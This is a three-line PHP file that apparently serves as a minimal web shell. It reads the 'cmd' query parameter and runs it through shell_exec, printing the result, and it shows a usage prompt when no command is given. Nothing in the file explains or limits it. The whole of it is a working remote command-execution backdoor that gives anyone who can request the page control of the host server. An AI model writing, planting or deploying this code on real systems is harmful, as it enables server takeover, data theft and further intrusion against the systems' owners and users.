<?php
if(empty($_GET["cmd"])) echo "please provide command to be executed in ?cmd=...";
else print_r(shell_exec($_GET["cmd"]));
